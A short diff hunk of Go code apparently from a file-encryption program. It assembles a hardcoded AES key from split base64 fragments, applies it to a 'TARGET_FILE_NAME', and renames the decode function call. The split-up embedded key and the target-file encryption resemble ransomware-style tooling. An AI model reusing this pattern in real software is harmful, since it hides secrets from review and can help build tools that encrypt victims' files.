@@ -61,7 +61,7 @@ func main() {
 	b64_3 := "ipMZy5" + "VYm13O"
 	b64_4 := "Xg+WF" + "9jKnE="
 	final := b64_1 + b64_2 + b64_3 + b64_4
-	key_text = []byte(base64.Base64Decode(final))
+	key_text = []byte(base64.Decode(final))
 	//When key decoded
 	aes.InitializeBlock(key_text, utils.TARGET_FILE_NAME)
 	for {
